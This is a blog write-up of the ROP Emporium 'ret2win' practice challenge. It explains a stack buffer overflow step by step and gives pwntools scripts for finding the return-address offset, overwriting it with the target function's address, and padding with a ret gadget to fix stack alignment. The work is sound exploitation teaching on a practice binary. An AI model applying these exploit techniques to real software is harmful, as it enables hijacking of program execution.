---
title: 'ROP emporium - ret2win'
date: 2024-09-26T18:42:47+02:00
draft: false
---

This is the [first challenge of ROP emporium](https://ropemporium.com/challenge/ret2win.html).
It focuses on exploiting a classic buffer overflow vulnerability to hijack the program's execution flow and return to a specific function.

## Analyzing the binary
First, we inspect the binary using `nm` to look for useful symbols. Among them, the ones of interest are:
```c
0000000000400697 T main
00000000004006e8 t pwnme
0000000000400756 t ret2win
```

From the names, it’s likely that the ret2win function is the one that will give us the flag.

To better understand the program's structure, let's decompile it using [Ghidra](https://github.com/NationalSecurityAgency/ghidra).

The resulting code looks like this:
```c

int main(void)
{
  setvbuf(stdout,NULL,2,0);
  puts("ret2win by ROP Emporium");
  puts("x86_64\n");
  pwnme();
  puts("\nExiting");
  return 0;
}

void pwnme(void)
{
  undefined buffer [32];
  [...]
  read(0,buffer,56);  // <-- buffer overflow :)
  puts("Thank you!");
  return;
}

void ret2win(void)
{
  puts("Well done! Here\'s your flag:");
  system("/bin/cat flag.txt");
  return;
}

```

We can see that the `ret2win` function is our target as we have supposed before.

The `pwnme` function reads 56 bytes into a 32-byte buffer, creating a classic buffer overflow vulnerability. This allows us to overwrite the return address and potentially redirect execution to the `ret2win` function.

## Understanding the stack layout

Right before a function is called, the current value of the Program Counter (i.e. the address of the next instruction to be executed) is saved on the stack. This saved return address allows the program to return to the correct location after the called function reaches the `ret` instruction. When the called function reaches the end, it pops the saved return address from the stack and moves it into the Program Counter, ensuring that execution continues from where the function was initially called.

By writing an address in the return address, we can redirect the execution of the program in that address.

The goal here is to call the `ret2win` function. We can take advantage of the buffer overflow to overwrite the return address and control the execution of the program redirecting it to `ret2win`.

![](/stack_based_buffer_overflow.svg)

From the stack layout shown in the figure, we can see that the Return Address is right after the buffer and the saved `RBP` register.

Disassembling the function with `objdump`, was can see how many bytes we have to write before reaching the return address.

```sh
objdump --disassemble=pwnme ret2win

00000000004006e8 <pwnme>:
  4006e8:	55                   	push   %rbp
  4006e9:	48 89 e5             	mov    %rsp,%rbp
  4006ec:	48 83 ec 20          	sub    $0x20,%rsp
  4006f0:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
  4006f4:	ba 20 00 00 00       	mov    $0x20,%edx
  4006f9:	be 00 00 00 00       	mov    $0x0,%esi
  4006fe:	48 89 c7             	mov    %rax,%rdi
  400701:	e8 7a fe ff ff       	call   400580 <memset@plt>

```
As you can see, it pushes `RBP` (8 bytes) and then 32 bytes (0x20) for our buffer. This means we need to overflow 40 bytes to overwrite the return address.

To ensure our offset calculation is correct, I used a [handy script](https://gist.githubusercontent.com/zachriggle/e4d591db7ceaafbe8ea32b461e239320/raw/367de5ca57bf1c9aa844ecf741b74dacb15a93e4/win.py) from this gist with the help of pwntools:

```python3
from pwn import *

# Set up pwntools to work with this binary
elf = context.binary = ELF('ret2win')

# Figure out how big of an overflow we need by crashing the
# process once.
io = process(elf.path)

# We will send a 'cyclic' pattern which overwrites the return
# address on the stack.  The value 128 is longer than the buffer.
io.sendline(cyclic(128))

# Wait for the process to crash
io.wait()

# Open up the corefile
core = io.corefile

# Print out the address of RSP at the time of crashing
stack = core.rsp
info("%#x stack", stack)

# Read four bytes from RSP, which will be some of our cyclic data.
#
# With this snippet of the pattern, we know the exact offset from
# the beginning of our controlled data to the return address.
pattern = core.read(stack, 4)
info("%r pattern", pattern)

offset = cyclic_find(pattern)
info("%d offset", offset)

```
Alternatively, you can run a debugger and check manually the offset of the return address.

## Crafting the exploit

In order to change the execution flow and redirect it to `ret2win`, we need to overflow the buffer by writing 40 bytes (it doesn't matter what they are), then the next 8 bytes will go in the return address used to return after the function. Here we can write the address of the ret2win function and the game should be done!

Retrieving the address of `ret2win` is pretty straighforward:
```sh
nm ret2win| grep ret2win
> 0000000000400756 t ret2win
```

So now we have everything we need to build our exploit:

```py
payload = b'A' * 40
payload += p64(elf.symbols.ret2win)

io = process(elf.path)
gdb.attach(io)
io.sendline(payload)
io.interactive()
```

I use the [ELF](https://docs.pwntools.com/en/stable/elf/elf.html) utility from pwntools to retrieve the address of the function `ret2win` to avoid incurring any errors. The [`p64`](https://docs.pwntools.com/en/stable/util/packing.html#pwnlib.util.packing.p64) function is used to convert the address from int to a byte string that we can write into the stdin of the process.

Run the exploit aaaand.. Ouuch.. Segmentation fault 🥲
```
Program received signal SIGSEGV, Segmentation fault.
0x00007a257c45842b in do_system (line=0x400943 "/bin/cat flag.txt") at ../sysdeps/posix/system.c:148
```
```
pwndbg> x/i 0x00007ec6b185842b
=> 0x7ec6b185842b <do_system+363>:	movaps XMMWORD PTR [rsp+0x50],xmm0
```
As written in the [Beginners' guide](https://ropemporium.com/guide.html#Common%20pitfalls), the problem was related to the stack being not aligned, I just had to pad the rop chain by adding another `ret` gadget before returning to the target function.

you can get it by running `ROPgadget --binary=ret2win | grep ": ret"` or alternatively you can use the [rop](https://docs.pwntools.com/en/stable/rop/rop.html) pwntools utility:

```python3
payload = b'A' * offset  # <--  computed before
payload += p64(rop.ret.address)
payload += p64(elf.symbols.ret2win)
```
![](/ret2win_chall.svg)

And finally the `ret2win` function that we just called prints our flag!
